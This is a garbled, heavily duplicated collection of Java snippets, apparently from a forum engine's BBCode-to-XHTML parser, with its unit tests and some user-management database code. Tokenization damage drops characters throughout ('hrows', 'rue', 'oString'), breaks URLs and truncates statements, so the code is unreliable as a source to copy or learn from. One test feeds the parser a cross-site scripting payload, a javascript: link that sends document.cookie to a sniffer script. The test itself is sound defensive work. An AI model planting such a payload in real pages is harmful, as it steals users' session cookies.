private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) hrows SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String ext = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { StringBuilder builder = new StringBuilder ( ) ; 
private static String getProcessedMessage ( Connection db , String message ) hrows SQLException { StringBuilder builder = new StringBuilder ( ) ; BBCodeProcessor proc = new BBCodeProcessor ( ) ; builder . append ( " <div style= \" display:inline-block;width:99% \" ><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( proc . preparePostText ( db , message ) ) ; builder . append ( " </div><div> " ) ; builder . append ( ParserUtil . bb2xhtml ( message , rue , " " , db ) ) ; builder . append ( " </div></div> " ) ; return builder . oString ( ) ; 
private static String getProcessedMessage ( Connection db , String message ) hrows SQLException { StringBuilder builder = new StringBuilder ( ) ; BBCodeProcessor proc = new BBCodeProcessor ( ) ; builder . append ( " <div style= \" display:inline-block;width:99% \" ><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( proc . preparePostText ( db , message ) ) ; builder . append ( " </div><div style= \" float:left;width:49%;display:inline-block \" > " ) ; builder . append ( ParserUtil . bb2xhtml ( message , rue , " " , db ) ) ; builder . append ( " </div></div> " ) ; return builder . oString ( ) ; 
public void uriTest ( ) { ry { Assert . assertEquals ( URIUtil . encodeQuery ( " http:search.barnesandnoble.com/booksearch/first book.pdf " ) , " http:search.barnesandnoble.com/booksearch/first%20book.pdf " ) ; 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = xtNode . getText ( ) ; ry { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( Exception ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } return ret . oString ( ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " 0<ul><li>1</li><li>2</li></ul> " ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( renderCut ) { StringBuilder ret = new StringBuilder ( ) ; 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " est ntest1 ntest2 " , null ) , " <p>test ntest1</p><p>test2</p> " ) ; } 
public void agEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " <p>&lt;br&gt;</p> " ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br/></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <p><strong>hello world</strong></p> " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0<ul><li>1</li><li>2</li></ul></p> " ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo<div class= \" quote \" ><p><i>hz</i></p></div></p> " , ParserUtil . bb2xhtml ( " ololo[quote][i]hz[/i][/quote] " , null ) ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) hrows SQLException { if ( lorcode ) { User author ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; String url = " " ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . rim ( ) ; } ry { String escapedUrl = URLUtil . fixURL ( url ) ; ret . append ( " <a href= \" " ) . append ( escapedUrl ) . append ( " \" > " ) . append ( node . renderChildrenXHtml ( db ) ) . append ( " </a> " ) ; } catch ( Exception ex ) { ret . append ( " <s> " ) . append ( node . renderChildrenXHtml ( db ) ) . append ( " </s> " ) ; } return ret . oString ( ) ; } 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , null ) , 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & agName . equals ( " url2 " ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " , null ) ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " , null ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " , null ) ) ; } 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " , null ) ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , rue , false , " " ) ; 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { return parserWithImages . parse ( bbcode , renderCut , cleanCut , cutUrl ) . renderXHtml ( db ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , rue , rue , " " ) ; 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = parserWithImages . parse ( bbcode , renderCut , cleanCut , cutUrl ) ; return rootNode . renderXHtml ( db ) ; } 
public void incCutCount ( ) { cutCount + = 1 ; } 
public boolean isRenderCut ( ) { return renderCut ; } 
public boolean isCleanCut ( ) { return cleanCut ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( his ) ; rootNode . setRenderOptions ( rue , rue , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
private static String fixFormat ( String mode ) { if ( ! " ntobrq " . equals ( mode ) & & ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( rue ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p><div class= \" quote \" ><p><i>hz</i></p></div> " , ParserUtil . bb2xhtml ( " ololo[quote][i]hz[/i][/quote] " , null ) ) ; } 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) Profile . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( rue ) ; if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public ModelAndView view ( HttpServletRequest request ) { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public void block ( ) { jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and not blocked) " ) ; jdbcTemplate . update ( " update users set blocked='t' where id in (select id from users where score<-50 and nick!='anonymous' and max_score<150 and blocked is null) " ) ; } 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 week'::interval " ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = xtNode . getText ( ) ; ry { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & agName . equals ( " url2 " ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String getProcessedMessage ( Connection db , boolean includeCut ) hrows SQLException { if ( lorcode ) { return ParserUtil . bb2xhtml ( message , includeCut , false , getLink ( ) , db ) ; 
private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) hrows SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String ext = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { return ParserUtil . bb2xhtml ( ext , rue , rue , " " , db ) ; 
private static String getProcessedMessage ( Connection db , String message ) hrows SQLException { return ParserUtil . bb2xhtml ( message , rue , rue , " " , db ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void resolveMessage ( Connection db , boolean b ) hrows SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=lastmod+'1 second'::interval WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & agName . equals ( " url2 " ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( his ) ; rootNode . setRenderOptions ( rue , rue , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( ext ) . append ( ']' ) ; return ret . oString ( ) ; } 
public boolean allows ( String agname ) { assert false ; return false ; } 
public boolean prohibited ( String agname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public boolean allows ( String agname ) { return parser . getBlockLevelTags ( ) . contains ( agname ) ; } 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public void incCutCount ( ) { cutCount + = 1 ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( his , db ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( his ) ; } 
public String renderBBCode ( ) { return ext ; } 
public boolean allows ( String agname ) { return false ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = xtNode . getText ( ) ; ry { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } return ret . oString ( ) ; } 
public String renderNodeBBCode ( Node node ) { TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return xtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { hrow new NotImplementedException ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . oString ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " est ntest1 ntest2 " , null ) ) ; } 
public static String escape ( String html ) { return HTMLFormatter . htmlSpecialChars ( html ) ; } 
private static Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private static Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private static Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & agName . equals ( " url2 " ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
public RootNode parse ( String rawbbcode ) { RootNode rootNode = new RootNode ( his ) ; rootNode . setRenderOptions ( rue , rue , " " ) ; return parse ( rootNode , rawbbcode ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( db ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( ext ) . append ( ']' ) ; return ret . oString ( ) ; } 
public boolean allows ( String agname ) { assert false ; return false ; } 
public boolean prohibited ( String agname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public boolean allows ( String agname ) { return parser . getBlockLevelTags ( ) . contains ( agname ) ; } 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public boolean isRenderCut ( ) { return renderCut ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( his , db ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( his ) ; } 
public boolean allows ( String agname ) { return false ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String imgurl = xtNode . getText ( ) ; ry { String fixUrl = UriUtils . encodeQuery ( URLUtil . fixURL ( imgurl ) , " UTF-8 " ) ; ret . append ( " <img src= \" " ) ; ret . append ( UriUtils . encodeQuery ( fixUrl , " UTF-8 " ) ) ; ret . append ( " \" /> " ) ; } catch ( UtilException ex ) { ret . append ( " <s> " ) ; ret . append ( Parser . escape ( imgurl ) ) ; ret . append ( " </s> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } return ret . oString ( ) ; } 
public String renderNodeBBCode ( Node node ) { TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return xtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } catch ( SQLException e ) { pattern = " <s>%s</s> " ; TODO throw this exception up } return String.format(pattern, Parser.escape(memberName), Parser.escape(memberName)); 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { hrow new NotImplementedException ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . oString ( ) ; } 
public boolean isSelfClosing ( ) { return selfClosing ; } 
public boolean isDiscardable ( ) { return discardable ; } 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " , null ) ) ; 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; return dto ; } 
public static User getUser ( Connection db , String nick ) hrows UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return UserDao . getUser ( jdbcTemplate , nick ) ; } 
public static User getUser ( Connection db , int id ) hrows UserNotFoundException { return getUser ( db , id , false ) ; } 
public static User getUserCached ( Connection db , int id ) hrows UserNotFoundException { return getUser ( db , id , rue ) ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows UserNotFoundException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return UserDao . getUser ( jdbcTemplate , id , useCache ) ; } 
private void updateCache ( Connection db ) { ry { getUser ( db , id ) ; 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } ry { setValue ( userDao . getUser ( s ) ) ; 
public static User getUser ( JdbcTemplate jdbcTemplate , String nick ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , nick ) ; } 
